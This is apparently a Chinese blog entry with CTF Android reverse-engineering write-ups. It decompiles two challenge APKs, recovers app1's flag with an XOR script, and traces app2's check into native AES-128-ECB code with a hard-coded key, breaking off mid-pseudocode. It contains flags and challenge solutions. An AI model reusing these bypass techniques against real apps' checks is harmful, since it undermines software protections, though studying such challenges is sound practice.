    <content type="html"><![CDATA[<p>持续更新。</p><a id="more"></a><h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><p>将 apk 拖入 jadx 进行反编译，查看入口点 MainActivity 代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.yaphetshan.tencentgreat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageInfo;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager.NameNotFoundException;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    Button btn;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String pName = BuildConfig.APPLICATION_ID;</span><br><span class="line">    EditText text;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.btn = (Button) findViewById(R.id.checBtn);</span><br><span class="line">        <span class="keyword">this</span>.text = (EditText) findViewById(R.id.input);</span><br><span class="line">        <span class="keyword">this</span>.btn.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    String inputString = MainActivity.<span class="keyword">this</span>.text.getText().toString();</span><br><span class="line">                    PackageInfo pinfo = MainActivity.<span class="keyword">this</span>.getPackageManager().getPackageInfo(BuildConfig.APPLICATION_ID, AccessibilityNodeInfoCompat.ACTION_COPY);</span><br><span class="line">                    String versionCode = pinfo.versionName; <span class="comment">// 获取包信息中的versionName</span></span><br><span class="line">                    <span class="keyword">int</span> versionName = pinfo.versionCode; <span class="comment">// 获取包信息中的versionCode</span></span><br><span class="line">                    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length()) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) &#123; <span class="comment">// 将versionCode中的每一字节和versionName异或并和输入比较</span></span><br><span class="line">                            Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u518d\u63a5\u518d\u5389\uff0c\u52a0\u6cb9~"</span>, <span class="number">1</span>).show(); <span class="comment">// 再接再厉，加油~</span></span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        i++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (inputString.length() == versionCode.length()) &#123; <span class="comment">// 判断输入的长度和versionCode是否相同</span></span><br><span class="line">                        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u606d\u559c\u5f00\u542f\u95ef\u5173\u4e4b\u95e8\uff01"</span>, <span class="number">1</span>).show(); <span class="comment">// 恭喜开启闯关之门！</span></span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NameNotFoundException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u5e74\u8f7b\u4eba\u4e0d\u8981\u800d\u5c0f\u806a\u660e\u5662"</span>, <span class="number">1</span>).show(); <span class="comment">// 年轻人不要耍小聪明噢</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中可以判断出是将 versionCode 和 versionName 进行异或然后和输入比较，具体信息可以在 AndroidManifest.xml 中找到：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">android:versionCode</span>=<span class="string">"15"</span> <span class="attr">android:versionName</span>=<span class="string">"X&lt;cP[?PHNB&lt;P?aj"</span> <span class="attr">package</span>=<span class="string">"com.example.yaphetshan.tencentgreat"</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">"25"</span> <span class="attr">platformBuildVersionName</span>=<span class="string">"7.1.1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">"19"</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">"25"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">"android.support.VERSION"</span> <span class="attr">android:value</span>=<span class="string">"25.3.0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span> <span class="attr">android:debuggable</span>=<span class="string">"true"</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span> <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span> <span class="attr">android:roundIcon</span>=<span class="string">"@mipmap/ic_launcher_round"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.example.yaphetshan.tencentgreat.MainActivity"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写脚本来得到 flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">versionCode = <span class="number">15</span></span><br><span class="line">versionName = <span class="string">"X&lt;cP[?PHNB&lt;P?aj"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> versionName:</span><br><span class="line">    flag += chr(ord(c) ^ versionCode)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># W3l_T0_GAM3_0ne</span></span><br></pre></td></tr></table></figure><h1 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h1><p>先使用 jadx 反编译，查看入口点的代码，在两个输入框中输入字符串后会去调用 SecondActivity：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tencent.testvuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.annotation.SuppressLint;</span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.BuildConfig;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> com.tencent.testvuln.c.SignatureTool;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressLint</span>(&#123;<span class="string">"ShowToast"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Button a;</span><br><span class="line">    <span class="keyword">private</span> Handler b = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> EditText c;</span><br><span class="line">    <span class="keyword">private</span> EditText d;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.a = (Button) findViewById(R.id.button1);</span><br><span class="line">        <span class="keyword">this</span>.a.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.c = (EditText) findViewById(R.id.editText1);</span><br><span class="line">        <span class="keyword">this</span>.d = (EditText) findViewById(R.id.editText2);</span><br><span class="line">        Editor edit = getSharedPreferences(<span class="string">"test"</span>, <span class="number">0</span>).edit();</span><br><span class="line">        edit.putLong(<span class="string">"ili"</span>, System.currentTimeMillis());</span><br><span class="line">        edit.commit();</span><br><span class="line">        Log.d(<span class="string">"hashcode"</span>, SignatureTool.getSignature(<span class="keyword">this</span>) + BuildConfig.VERSION_NAME);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem menuItem)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (menuItem.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(menuItem);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (view.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.button1:</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.c.getText().length() == <span class="number">0</span> || <span class="keyword">this</span>.d.getText().length() == <span class="number">0</span>) &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">"\u4e0d\u80fd\u4e3a\u7a7a"</span>, <span class="number">1</span>).show(); <span class="comment">// 不能为空</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String obj = <span class="keyword">this</span>.c.getText().toString(); <span class="comment">// 获取第一个输入框中的字符串</span></span><br><span class="line">                String obj2 = <span class="keyword">this</span>.d.getText().toString(); <span class="comment">// 获取第二个输入框中的字符串</span></span><br><span class="line">                Log.e(<span class="string">"test"</span>, obj + <span class="string">" test2 = "</span> + obj2);</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, SecondActivity.class); <span class="comment">// 设置Intent跳转到SecondActivity</span></span><br><span class="line">                intent.putExtra(<span class="string">"ili"</span>, obj); <span class="comment">// 设置变量ili的值为obj的值</span></span><br><span class="line">                intent.putExtra(<span class="string">"lil"</span>, obj2); <span class="comment">// 设置变量lil的值为obj2的值</span></span><br><span class="line">                startActivity(intent); <span class="comment">// 调用SecondActivity</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来看看 SecondActivity，将输入的字符串拼接起来，经过 Encryto.doRawData 的操作后和一串 base64 进行比较：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tencent.testvuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> com.tencent.testvuln.c.Encryto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecondActivity</span> <span class="keyword">extends</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> BroadcastReceiver c = <span class="keyword">new</span> BroadcastReceiver(<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="comment">/* synthetic */</span> SecondActivity a;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.a = r1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">"myReceiver receive"</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">if</span> (!context.getPackageName().equals(intent.getAction())) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main2);</span><br><span class="line">        Intent intent = getIntent();</span><br><span class="line">        String stringExtra = intent.getStringExtra(<span class="string">"ili"</span>); <span class="comment">// obj</span></span><br><span class="line">        String stringExtra2 = intent.getStringExtra(<span class="string">"lil"</span>); <span class="comment">// obj2</span></span><br><span class="line">        <span class="keyword">if</span> (Encryto.doRawData(<span class="keyword">this</span>, stringExtra + stringExtra2).equals(<span class="string">"VEIzd/V2UPYNdn/bxH3Xig=="</span>)) &#123; <span class="comment">// 判断obj+obj2经过Encryto.doRawData后是否等于指定字符串</span></span><br><span class="line">            intent.setAction(<span class="string">"android.test.action.MoniterInstallService"</span>);</span><br><span class="line">            intent.setClass(<span class="keyword">this</span>, MoniterInstallService.class);</span><br><span class="line">            intent.putExtra(<span class="string">"company"</span>, <span class="string">"tencent"</span>);</span><br><span class="line">            intent.putExtra(<span class="string">"name"</span>, <span class="string">"hacker"</span>);</span><br><span class="line">            intent.putExtra(<span class="string">"age"</span>, <span class="number">18</span>);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">            startService(intent);</span><br><span class="line">        &#125;</span><br><span class="line">        Editor edit = getSharedPreferences(<span class="string">"test"</span>, <span class="number">0</span>).edit();</span><br><span class="line">        edit.putString(<span class="string">"ilil"</span>, stringExtra);</span><br><span class="line">        edit.putString(<span class="string">"lili"</span>, stringExtra2);</span><br><span class="line">        edit.commit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem menuItem)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (menuItem.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(menuItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我找到了 Encryto.doRawData 函数的位置。可以看到这里的所有函数都是在 Native 层实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tencent.testvuln.c;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encryto</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">checkSignature</span><span class="params">(Object obj)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">decode</span><span class="params">(Object obj, String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">doRawData</span><span class="params">(Object obj, String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">encode</span><span class="params">(Object obj, String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">HelloLoad</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"JNIEncrypt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 IDA 打开 libJNIEncrypt.so，然后定位到 JNI_OnLoad，并找到被动态注册的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.data:00006008 off_6008        DCD aChecksignature_0   ; DATA XREF: register_ndk_load+22↑o</span><br><span class="line">.data:00006008                                         ; .text:off_221C↑o</span><br><span class="line">.data:00006008                                         ; &quot;checkSignature&quot;</span><br><span class="line">.data:0000600C                 DCD aLjavaLangObjec     ; &quot;(Ljava/lang/Object;)I&quot;</span><br><span class="line">.data:00006010                 DCD check+1</span><br><span class="line">.data:00006014                 DCD aDecode_0           ; &quot;decode&quot;</span><br><span class="line">.data:00006018                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;...</span><br><span class="line">.data:0000601C                 DCD decode+1</span><br><span class="line">.data:00006020                 DCD aEncode_0           ; &quot;encode&quot;</span><br><span class="line">.data:00006024                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;...</span><br><span class="line">.data:00006028                 DCD encode+1</span><br><span class="line">.data:0000602C                 DCD aDorawdata_0        ; &quot;doRawData&quot;</span><br><span class="line">.data:00006030                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;...</span><br><span class="line">.data:00006034                 DCD doRawData+1</span><br><span class="line">.data:00006034 ; .data         ends</span><br></pre></td></tr></table></figure><p>看一下其中的 doRawData 函数，发现其中调用了一个 j_AES_128_ECB_PKCS5Padding_Encrypt 函数，可以大概推断出经过了 AES-128 的加密，且加密模式用了 ECB，Padding 用了 PKCS5：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">doRawData</span><span class="params">(_JNIEnv *env, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *utf_string; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> ciphertext; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  jstring (__cdecl *v9)(JNIEnv *, <span class="keyword">const</span> jchar *, jsize); <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> key; <span class="comment">// [sp+0h] [bp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [sp+18h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = env;</span><br><span class="line">  v5 = <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">if</span> ( j_checkSignature((<span class="keyword">int</span>)env, a2, a3) == <span class="number">1</span></span><br><span class="line">    &amp;&amp; (<span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;key, <span class="string">"thisisatestkey=="</span>),</span><br><span class="line">        utf_string = (<span class="keyword">const</span> <span class="keyword">char</span> *)((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">char</span> *, _DWORD))v4-&gt;functions-&gt;GetStringUTFChars)(</span><br><span class="line">                                     v4,</span><br><span class="line">                                     v5,</span><br><span class="line">                                     <span class="number">0</span>),</span><br><span class="line">        ciphertext = j_AES_128_ECB_PKCS5Padding_Encrypt(utf_string, (<span class="keyword">int</span>)&amp;key),</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv 